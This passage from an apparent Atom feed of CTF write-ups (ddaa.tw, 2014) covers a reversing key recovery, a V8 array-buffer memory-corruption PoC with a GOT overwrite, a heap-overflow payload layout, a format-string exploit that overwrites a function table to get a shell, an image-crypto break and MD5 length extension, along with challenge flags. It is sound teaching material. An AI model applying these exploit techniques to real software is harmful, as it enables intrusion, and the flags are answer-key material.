&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;sub_8048A32&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;src&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
&lt;span class="nt"&gt;strtobigint&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;src&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;argv&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
&lt;span class="nt"&gt;memcpy&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;src&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;sizeof&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;
&lt;span class="nt"&gt;v3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nt"&gt;check_key2&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;argv&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;n&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;)^&lt;/span&gt;&lt;span class="nt"&gt;1&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;sub_8048A58&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
&lt;span class="nt"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;v3&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="err"&gt;puts(&amp;quot;Wrongpassword&amp;quot;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="err"&gt;v2=1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nt"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="err"&gt;printf(&amp;quot;&lt;/span&gt;&lt;span class="n"&gt;Theflagis&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;%s&amp;#39;&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="err"&gt;v2=0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;第二部分會先將 &lt;code&gt;argv[2]&lt;/code&gt; 轉換成一個 struct&lt;br&gt;
架構大概長這樣：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;struct bigint{
  int signed;
  unsigned int length[2];
  unsigned int value[2000];
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;接著進入到 &lt;code&gt;check_key2()&lt;/code&gt; 裡面&lt;br&gt;
程式流程如下：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;memcpy(&amp;amp;_bigint,bigint,8008u);
sub_804b330(digits,&amp;amp;_bigint,n);
sub_8048A58(&amp;amp;_bigint);
_0x31=n;
for (i=0;i&amp;lt;_0x31;++i){
  v12=0;
  for (j=0;j&amp;lt;i;++j){
    v3=*next_digit(digits,j);
    if (v3&amp;gt;*next_digit(digits,i))
      ++v12;
  }
  if (dword_804F280[i]!=v12){
    v4=0;
    gotoLABEL_15;
  }
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;首先是 &lt;code&gt;sub_804b330&lt;/code&gt; 這個 function&lt;br&gt;
會將 &lt;code&gt;argv[2]&lt;/code&gt; 所輸入的數字&lt;br&gt;
轉變成一個 mod 49 的多項式&lt;br&gt;
像是 &lt;code&gt;a48 * x^48 + a47 * x^47 + ... + a1 * x + a0&lt;/code&gt; 這樣子&lt;br&gt;
此外還會確認 a0 ~ a48 是否全部不相同&lt;br&gt;
如果有任兩個相同會直接印出 &lt;code&gt;Wrong password&lt;/code&gt; 並結束程式  &lt;/p&gt;
&lt;p&gt;接下來程式會用兩個 for loop 去檢查分解出來的係數&lt;br&gt;
如果第 n 個係數 an &amp;lt; 前面的任一係數 ai&lt;br&gt;
v12 的值就會 +1&lt;br&gt;
接著對 v12 的值與保存於 &lt;code&gt;dword_804F280&lt;/code&gt; 做比較&lt;br&gt;
其值依序為   &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;0 1 0 1 1 1 2 4 1 3 1 6 2 4 5 2 16 17 0 16 2 14 9 1 15 9 10 14 0 15 17 27 4 17 14 10 5 7 13 21 35 9 28 25 42 23 8 45 27&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;因為係數的值彼此不同&lt;br&gt;
比較係數大小可以確保係數的順序是正確&lt;br&gt;
接著要從 &lt;code&gt;dword_804F280&lt;/code&gt; 去推算出正確的順序是多少&lt;br&gt;
觀察了一下發現到一件很重要的事情：&lt;br&gt;
&lt;strong&gt;最晚出現的 0 代表其係數為 48&lt;/strong&gt;&lt;br&gt;
可以用反證法來推論其正確：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如果更前面有係數為 48 ， dword_804F280[i] 不會是 0&lt;/li&gt;
&lt;li&gt;如果更後面的係數為 48 ， dword_804F280[i] 不會是最後一個出現的 0&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;最後一個 0 在 index = 23 的位置&lt;br&gt;
因此 a23 = 48&lt;br&gt;
接著我們把 48 扣掉&lt;br&gt;
並且把 &lt;code&gt;dword_804F280&lt;/code&gt; 所有 index &amp;gt; 23 的值 -1&lt;br&gt;
現在最後一個 0 所代表的值就是 47&lt;br&gt;
以此類推 我們可以得到所有的係數&lt;br&gt;
最後將所有係數透過多項式算出的大數為 &lt;code&gt;28367585747398446017812492718893415428463369378432457345198085366128794480569061784&lt;/code&gt;&lt;br&gt;
也就是第二個參數&lt;br&gt;
兩個參數都正確 flag 也就噴出來了  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;./exec&lt;br&gt;
key 1 = 3 lroea5 r  tfmh0wl1y15on 3y! 4n 50r,30wv3r !4kwi&lt;br&gt;
The flag is : 'w0w! 1nv3r51on arr4y i5 4we50m3 f0r th3 k3y, lol!'  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;flag: &lt;code&gt;w0w! 1nv3r51on arr4y i5 4we50m3 f0r th3 k3y, lol!&lt;/code&gt;&lt;/p&gt;</content><category term="Other CTF"></category></entry><entry><title>Secuinside ctf 2014 pwn 300 yet-another-javascript-jail</title><link href="https://ddaa.tw/secuinside_pwn_300_yet_another_js_jail.html" rel="alternate"></link><published>2014-06-06T03:33:00+08:00</published><updated>2014-06-06T03:33:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-06-06:/secuinside_pwn_300_yet_another_js_jail.html</id><summary type="html">&lt;p&gt;這題沒解出來 QQ&lt;br&gt;
找錯 CVE 真是太囧了&lt;br&gt;
如果找對個應該是有機會可以解出來吧...  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題是一個 javascipt 的 jail 環境&lt;br&gt;
可以任意執行一些 js 的指令&lt;br&gt;
part1 dm4 秒殺了 XD&lt;br&gt;
做法是 overwrite &lt;code&gt;Array.prototype.toString&lt;/code&gt;&lt;br&gt;
過 part1 以後得到一個 elf&lt;br&gt;
不看還好...reverse 以後嚇一跳&lt;br&gt;
根本就是一個 v8 engine = =  &lt;/p&gt;
&lt;p&gt;比對 &lt;code&gt;RunShell()&lt;/code&gt; 和 example code 以後&lt;br&gt;
沒看到什麼能利用的地方&lt;br&gt;
初步判定洞是在 v8 裡面&lt;br&gt;
而且上一題的 jsjail 版本比較新&lt;br&gt;
就猜這題的解法應該跟 cve 有關&lt;br&gt;
結果找錯個 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;這題沒解出來 QQ&lt;br&gt;
找錯 CVE 真是太囧了&lt;br&gt;
如果找對個應該是有機會可以解出來吧...  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題是一個 javascipt 的 jail 環境&lt;br&gt;
可以任意執行一些 js 的指令&lt;br&gt;
part1 dm4 秒殺了 XD&lt;br&gt;
做法是 overwrite &lt;code&gt;Array.prototype.toString&lt;/code&gt;&lt;br&gt;
過 part1 以後得到一個 elf&lt;br&gt;
不看還好...reverse 以後嚇一跳&lt;br&gt;
根本就是一個 v8 engine = =  &lt;/p&gt;
&lt;p&gt;比對 &lt;code&gt;RunShell()&lt;/code&gt; 和 example code 以後&lt;br&gt;
沒看到什麼能利用的地方&lt;br&gt;
初步判定洞是在 v8 裡面&lt;br&gt;
而且上一題的 jsjail 版本比較新&lt;br&gt;
就猜這題的解法應該跟 cve 有關&lt;br&gt;
結果找錯個 e04...&lt;br&gt;
[http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1705]&lt;br&gt;
這個才是正確的 = =&lt;br&gt;
被分類在 chrome 裡面 之前用 v8 下去找沒看到&lt;br&gt;
這是一個可以任意讀寫記憶體位置的漏洞&lt;br&gt;
&lt;a href="https://code.google.com/p/v8/source/browse/branches/3.24/test/mjsunit/regress/regress-crbug-351787.js"&gt;poc&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;var ab4 = new ArrayBuffer(8);
ab4.__defineGetter__(&amp;quot;byteLength&amp;quot;, function() { return 0xFFFFFFFC; });
var aaaa = new Uint32Array(ab4);
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;關鍵代碼是這三行&lt;br&gt;
執行這三行以後就可以透過 &lt;code&gt;aaaa&lt;/code&gt; 的 pointer 去任意讀寫 memory&lt;br&gt;
原理我實在是找不到說明 也 trace 不出來 Orz&lt;br&gt;
不負責任猜測是將 array 的長度設成超大  &lt;/p&gt;
&lt;p&gt;執行 poc 後在 &lt;code&gt;ExecuteString()&lt;/code&gt; 的地方確認 memory 的狀態&lt;br&gt;
會發現 heap 中有大量的區塊都被改成 &lt;code&gt;aaaaaaaa&lt;/code&gt;&lt;br&gt;
一直往上爬就可以推算出 &lt;code&gt;aaaa&lt;/code&gt; 的 pointer 位於 &lt;code&gt;0x09196eb8&lt;/code&gt;&lt;br&gt;
所以我們透過 &lt;code&gt;aaaa[i] = 0xAAAAAAAA&lt;/code&gt; 的方式就可以改寫記憶體了&lt;br&gt;
但是要 overwrite 哪裡 ... ?&lt;br&gt;
仔細觀察後發現讀取指令的部分是利用 &lt;code&gt;fgets()&lt;/code&gt; 去得到 input&lt;br&gt;
got table 也是可以被 overwrite 的區域&lt;br&gt;
因此目標應該就是將 &lt;code&gt;fgets()&lt;/code&gt; 換成我們要的區域了&lt;br&gt;
(不過在這邊我沒有看到 system() 之類的 function 好利用...)&lt;br&gt;
(別人的 write up 寫有 system 可以跳)&lt;br&gt;
(在想是否因為題目環境是 ubuntu 14.04 的關係...)  &lt;/p&gt;
&lt;p&gt;but &lt;code&gt;fget()&lt;/code&gt; 在 got table 的位置是 &lt;code&gt;0x091680a8&lt;/code&gt;&lt;br&gt;
欸...嘗試一下 index 好像不能用負數&lt;br&gt;
這樣豈不是改不到嗎...?&lt;br&gt;
卡關很久才發現這邊有 interger overflow 的情況&lt;br&gt;
這邊取得 dst pointer 的做法是 &lt;code&gt;*aaaa + index*4&lt;/code&gt;&lt;br&gt;
因此只要 index 夠大&lt;br&gt;
就會被當成負數做判斷&lt;br&gt;
如此一來就能任意跳轉記憶體位置了  &lt;/p&gt;
&lt;p&gt;btw 聽說這個 cve 是 tomcr00se 舉報的 XDDD  &lt;/p&gt;</content><category term="Other CTF"></category><category term="CVE"></category></entry><entry><title>DEF CON 22 CTF Quals Baby's First heap</title><link href="https://ddaa.tw/defcon_pwn_baby_first_heap.html" rel="alternate"></link><published>2014-05-20T01:31:00+08:00</published><updated>2014-05-20T01:31:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-05-20:/defcon_pwn_baby_first_heap.html</id><summary type="html">&lt;p&gt;這題是第一天在看的&lt;br&gt;
在嘗試做 payload 時 &lt;strong&gt;jeffxx&lt;/strong&gt; 就解完啦 XD&lt;br&gt;
不過還是厚著臉皮寫一下 write up  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;連上去環境後得到這樣的訊息：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Welcome to your first heap overflow...&lt;br&gt;
I am going to allocate 20 objects...&lt;br&gt;
Using Dougle Lee Allocator 2.6.1...&lt;br&gt;
Goodluck!&lt;br&gt;
Exit function pointer is at 804C8AC address.&lt;br&gt;
[ALLOC][loc=9DE4008][size=1246]&lt;br&gt;
[ALLOC][loc=9DE44F0][size=1121]&lt;br&gt;
...&lt;br&gt;
Write …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;p&gt;這題是第一天在看的&lt;br&gt;
在嘗試做 payload 時 &lt;strong&gt;jeffxx&lt;/strong&gt; 就解完啦 XD&lt;br&gt;
不過還是厚著臉皮寫一下 write up  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;連上去環境後得到這樣的訊息：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Welcome to your first heap overflow...&lt;br&gt;
I am going to allocate 20 objects...&lt;br&gt;
Using Dougle Lee Allocator 2.6.1...&lt;br&gt;
Goodluck!&lt;br&gt;
Exit function pointer is at 804C8AC address.&lt;br&gt;
[ALLOC][loc=9DE4008][size=1246]&lt;br&gt;
[ALLOC][loc=9DE44F0][size=1121]&lt;br&gt;
...&lt;br&gt;
Write to object [size=260]:&lt;br&gt;
123&lt;br&gt;
Copied 4 bytes.&lt;br&gt;
[FREE][address=9DE4008]&lt;br&gt;
[FREE][address=9DE44F0]&lt;br&gt;
...&lt;br&gt;
[FREE][address=9DE84B0]&lt;br&gt;
Did you forget to read the flag with your shellcode?&lt;br&gt;
Exiting  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;好像就只是個簡單的 heap overflow ?&lt;br&gt;
一開始以為要用舊的環境才能測&lt;br&gt;
就用 2.6.32 在 debug&lt;br&gt;
後來發現 &lt;code&gt;free()&lt;/code&gt; 好像是程式自帶的&lt;br&gt;
我在 3.8.0-29 測試也沒問題&lt;br&gt;
(有錯請告知 QQ)  &lt;/p&gt;
&lt;p&gt;這題會 allocate 20 次空間&lt;br&gt;
接著讓我們輸入一個字串&lt;br&gt;
把字串 copy 到 第 10 個空間&lt;br&gt;
再把 20 個空間給 free&lt;br&gt;
隨便輸入一下 發現 &amp;gt;=260 個 byte 就會 crash&lt;br&gt;
直接開 gdb 去看原因&lt;br&gt;
是死在這一行  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0x80493f6 &amp;lt;free+273&amp;gt;:        mov    DWORD PTR [eax+0x8],ed
eax            0x61616161  
edx            0x61616161  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;看起來這邊可以任意寫入記憶體&lt;br&gt;
嘗試一下把題目的 &lt;code&gt;exit_func&lt;/code&gt; 改掉  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0x80493ff &amp;lt;free+282&amp;gt;:        mov    DWORD PTR [eax+0x4],edx
eax            0x61616161
edx            0x804c8a4 
x/xw 0x804c8ac
0x804c8ac &amp;lt;exit_func&amp;gt;:  0x61616161
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;喔喔 成功改掉了 但是依然 crash&lt;br&gt;
所以要 jmp 的位置也要可寫入才行&lt;br&gt;
不過 heap 本來就能寫所以沒啥問題&lt;br&gt;
就正式來一次吧  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0x80493f6 &amp;lt;free+273&amp;gt;:        mov    DWORD PTR [eax+0x8],edx
eax            0x0
edx            0x0
0x804c8ac &amp;lt;exit_func&amp;gt;:  0x0804f350
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;WTF? 還是 crash&lt;br&gt;
原本以為是 overwrite 失敗&lt;br&gt;
但是仔細一看問題是出在下一次 call free 才 crash&lt;br&gt;
我卡在這時 jeffxx 就解完了 XD&lt;br&gt;
原本是打算去改 &lt;code&gt;free()&lt;/code&gt; 的 GOT&lt;br&gt;
才發現 &lt;code&gt;free()&lt;/code&gt; 寫死了沒辦法改&lt;br&gt;
不過還有個 &lt;code&gt;printf()&lt;/code&gt; 可以改&lt;br&gt;
&lt;code&gt;printf()&lt;/code&gt; 的位置在 0x0804c004&lt;br&gt;
要跳轉出來的位置就是他 print 出的第 10 個位置 XDDD&lt;br&gt;
最後的 payload 是：&lt;br&gt;
&lt;code&gt;[jmp addr][0x0804c000][nop][addr]&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;剩下就是寫 shellcode 了&lt;br&gt;
因為會 write 兩次&lt;br&gt;
我是第二次才 overwrite GOT&lt;br&gt;
由於第一次會把 jmp addr +8 的地方改成 &lt;code&gt;0x0804c000&lt;/code&gt;&lt;br&gt;
要記得被改爛的這 4 byte 給跳開&lt;br&gt;
這樣就成功拿到 shell 了  &lt;/p&gt;</content><category term="DEF CON CTF"></category><category term="Heap Overflow"></category></entry><entry><title>ASIS CTF Crypto 150 Random Image</title><link href="https://ddaa.tw/asisctf_crypto_150_random_image.html" rel="alternate"></link><published>2014-05-16T22:16:00+08:00</published><updated>2014-05-16T22:16:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-05-16:/asisctf_crypto_150_random_image.html</id><summary type="html">&lt;p&gt;I didn't spend a lot of time at this CTF because I need to present my project about openstack. 217 is very powerful. When I joined the game, most of problems have been solved. I tried to solve the problem &lt;strong&gt;easy reading&lt;/strong&gt;, but finally it was fruitless. (Nobody solved it …&lt;/p&gt;</summary><content type="html">&lt;p&gt;I didn't spend a lot of time at this CTF because I need to present my project about openstack. 217 is very powerful. When I joined the game, most of problems have been solved. I tried to solve the problem &lt;strong&gt;easy reading&lt;/strong&gt;, but finally it was fruitless. (Nobody solved it.)  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;First, we downloaded the picture &lt;code&gt;enc.png&lt;/code&gt; from problem. That is a black-and-white picture. Besite the picture, there is an encrypt program that is written by python.&lt;br&gt;
&lt;img alt="enc.png" src="https://ddaa.tw/images/asisctf_2014_randomimage_1.png"&gt;  &lt;/p&gt;
&lt;p&gt;Observate the program, it loaded an image file into the object. Then the program created another imgae object that had the same size with the last one. After creating the object, the program filled the image with color from 0 to 249.  &lt;/p&gt;
&lt;p&gt;In following of codes, the program compared each pixel of original picture. If the color of pixel is smaller than 250, it will call &lt;code&gt;get_color()&lt;/code&gt; to calculate other value and stored it into new image. Therefor, the other pixels are the pattern of the flag.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def get_color(x, y, r):
  n = (pow(x, 3) + pow(y, 3)) ^ r
  return (n ^ ((n &amp;gt;&amp;gt; 8) &amp;lt;&amp;lt; 8 ))
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;r&lt;/code&gt; is a random number from 1 to 2^256. However, after computing by &lt;code&gt;get_color&lt;/code&gt;, it only had 256 values. We search a pixel with value bigger than 250, then try 256 times to break &lt;code&gt;r&lt;/code&gt;.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def get_r(e,x,y):
    for r in range(256):
        if get_color(x,y,r) == e:
            return r
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Once we get the value of &lt;code&gt;r&lt;/code&gt;, we can seperate the flag and other pixels through expression &lt;code&gt;enpix[x,y] == get_color(x,y,r)&lt;/code&gt;.&lt;br&gt;
&lt;img alt="flag.png" src="https://ddaa.tw/images/asisctf_2014_randomimage_flag.png"&gt;  &lt;/p&gt;</content><category term="Other CTF"></category></entry><entry><title>Dragon Sector CTF 2014 Pwnable200</title><link href="https://ddaa.tw/dsctf_pwn_200_calc_machine.html" rel="alternate"></link><published>2014-04-29T03:15:00+08:00</published><updated>2014-04-29T03:15:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-04-29:/dsctf_pwn_200_calc_machine.html</id><summary type="html">&lt;p&gt;I almost forget how to use format string vulnerability attack......  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;After connecting the server, we can get the message like that:  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Welcome to Multipurpose Calculation Machine!&lt;br&gt;
Menu:&lt;br&gt;
  add:  Addition&lt;br&gt;
  sub:  Subtraction&lt;br&gt;
  mul:  Multiplication&lt;br&gt;
  div:  Division&lt;br&gt;
  pow:  Power&lt;br&gt;
  mod:  Modulo&lt;br&gt;
  sin:  Sinus&lt;br&gt;
  cos:  Cosinus&lt;br&gt;
  tan:  Tangens&lt;br&gt;
  cot:  Cotangens&lt;br&gt;
  quit&lt;br&gt;
Choice: add …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;p&gt;I almost forget how to use format string vulnerability attack......  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;After connecting the server, we can get the message like that:  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Welcome to Multipurpose Calculation Machine!&lt;br&gt;
Menu:&lt;br&gt;
  add:  Addition&lt;br&gt;
  sub:  Subtraction&lt;br&gt;
  mul:  Multiplication&lt;br&gt;
  div:  Division&lt;br&gt;
  pow:  Power&lt;br&gt;
  mod:  Modulo&lt;br&gt;
  sin:  Sinus&lt;br&gt;
  cos:  Cosinus&lt;br&gt;
  tan:  Tangens&lt;br&gt;
  cot:  Cotangens&lt;br&gt;
  quit&lt;br&gt;
Choice: add&lt;br&gt;
[add] Choose the number of parameters: 1&lt;br&gt;
[add] Provide parameter 1: 1&lt;br&gt;
[add] Message of the day: Don't cry because it's over, smile because it happened. -- Dr. Seuss, operands: [1]&lt;br&gt;
[add] The sum of provided numbers is 1  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Expect the choice, the problem uses &lt;code&gt;scanf("%u")&lt;/code&gt; to get users input.  So there hasn't bof to overwrite memorys. In each choice, the programe uses &lt;code&gt;printf(format)&lt;/code&gt; to print "Message of day" and "operands". The length of &lt;code&gt;format&lt;/code&gt; is 308 bytes. And the problem runs a for loop which counts to 308 and checks whether &lt;code&gt;foramt&lt;/code&gt; has &lt;code&gt;%&lt;/code&gt; symbol.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;strncpy(format,unk_3bc0,n);
for(j=0;j&amp;lt;n;j++){ //n=308
    if(format[j]==&amp;#39;%&amp;#39;)
    format[j]=&amp;#39;_&amp;#39;;
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It seems to prevent the format string attack. However, if the length of "Message of day" + "operand" + others is bigger than 308, it will cause the end of string &lt;code&gt;\0&lt;/code&gt; be overwrite. Luckily, the input of choice is behind of &lt;code&gt;format&lt;/code&gt;. Thus, we can bypass the filter of &lt;code&gt;%&lt;/code&gt; symbol and use the format string vulnerability.  &lt;/p&gt;
&lt;p&gt;Then we use &lt;code&gt;%x&lt;/code&gt; to leak the memory, and notice the program uses ASLR protection. We must calculate the base by subtracting &lt;code&gt;0x3b00&lt;/code&gt;. Then using &lt;code&gt;%n&lt;/code&gt; to overwrite memory. I try to overwrite return address at first, but it's not work. I use GDB to trace the program , it execute &lt;code&gt;system('/bin/sh')&lt;/code&gt; indeed. However it doesn't open shell. So I decide to try another way.  &lt;/p&gt;
&lt;p&gt;The &lt;code&gt;main&lt;/code&gt; function will dynamic execute the function that maps to each choice. The function table is started at 0x3b00. I decide to overwrite &lt;code&gt;quit&lt;/code&gt; choice, it is at 0x3b80 and its value is 0x1fea. After overwriting it to 0x0d20,we can type &lt;code&gt;quit&lt;/code&gt; and get the shell.  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;DSCTF_d7b9926c37e5e6b1f796abaf8a3ae7a26050ddb78c4685985321f03d6fd273ba&lt;/code&gt;&lt;/p&gt;</content><category term="Other CTF"></category><category term="Format String"></category></entry><entry><title>Plaid CTF 2014 Crypto 250 Parlor</title><link href="https://ddaa.tw/plaidctf_crypto_250_parlor.html" rel="alternate"></link><published>2014-04-17T10:37:00+08:00</published><updated>2014-04-17T10:37:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-04-17:/plaidctf_crypto_250_parlor.html</id><summary type="html">&lt;p&gt;這題是 217 的大大們解出來的&lt;br&gt;
我知道關鍵後&lt;br&gt;
隔天才自己做一遍&lt;br&gt;
寫程式太慢了.........  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題連到目標環境後敘述如下：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/------------------------------------------------------------------------------\
| Welcome to the betting parlor!                                               |
|                                                                              |
| We implement State of the Art cryptography to give you the fairest and most  |
| exciting betting experience!                                                 |
|                                                                              |
| Here&amp;#39;s how it works: we both pick a nonce, you tell us odds, and you give us |
| some money.                                                                  |
| If …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;這題是 217 的大大們解出來的&lt;br&gt;
我知道關鍵後&lt;br&gt;
隔天才自己做一遍&lt;br&gt;
寫程式太慢了.........  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題連到目標環境後敘述如下：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/------------------------------------------------------------------------------\
| Welcome to the betting parlor!                                               |
|                                                                              |
| We implement State of the Art cryptography to give you the fairest and most  |
| exciting betting experience!                                                 |
|                                                                              |
| Here&amp;#39;s how it works: we both pick a nonce, you tell us odds, and you give us |
| some money.                                                                  |
| If md5(our number + your number) % odds == 0, you win bet amount*odds.       |
| UPDATE: IF YOU DIDN&amp;#39;T REALIZE IT, WE DO INCLUDE A NEWLINE AT THE END OF YOUR |
| NUMBER. SORRY FOR THE INCONVENIENCE. THANK YOU FOR USING PARLOR              |
| Otherwise, we get your money! We&amp;#39;re even so nice, we gave you $1000 to start.|
|                                                                              |
| If you don&amp;#39;t trust us, we will generate a new nonce, and reveal the old nonce|
| to you, so you can verify all of our results!                                |
|                                                                              |
| (Oh, and if you win a billion dollars, we&amp;#39;ll give you a flag.)               |
\______________________________________________________________________________/

====================
  1) set your odds
  2) set your bet
  3) play a round
  4) get balance
  5) reveal nonce
  6) quit
====================
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;規則總結如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;設定一個模數 odds&lt;/li&gt;
&lt;li&gt;下注 bet&lt;/li&gt;
&lt;li&gt;猜一個數字 your num (之後簡稱num)&lt;/li&gt;
&lt;li&gt;如果滿足 &lt;code&gt;md5(our num + your num) % odds == 0&lt;/code&gt;, 則獲得 odds * bet 的金額&lt;/li&gt;
&lt;li&gt;贏得 100w &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;雖然題目說要我們猜一個數字並與 nonce 相加&lt;br&gt;
但是將 nonce reveal 出來&lt;br&gt;
會是一段 hex&lt;br&gt;
轉為 byte 以後，與 num 相加，做 md5 再 % odds&lt;br&gt;
可以到相同的結果&lt;br&gt;
所以其實是字串相加，而不是數字  &lt;/p&gt;
&lt;p&gt;這題如果能預先算出 md5 的結果&lt;br&gt;
就能輕鬆獲勝了&lt;br&gt;
有一種 hash 的攻擊方式叫做 &lt;strong&gt;Length Extension Attack&lt;/strong&gt; (後簡稱 LEA)&lt;br&gt;
適用於大部分的 hash，如 md5 sha1 sha256&lt;br&gt;
可以在不知道 text，只知道 hash 過的結果的情況下&lt;br&gt;
預測 &lt;code&gt;hash(text + padding + suffix)&lt;/code&gt; 的結果  &lt;/p&gt;
&lt;p&gt;這邊研究了一下 md5 hash 的過程&lt;br&gt;
首先會切成數個 64 byte 的 block&lt;br&gt;
最後一個 block 如果不是 56 byte 會做 padding&lt;br&gt;
padding 的方式是第一個 byte 為 &lt;code&gt;\x80&lt;/code&gt;&lt;br&gt;
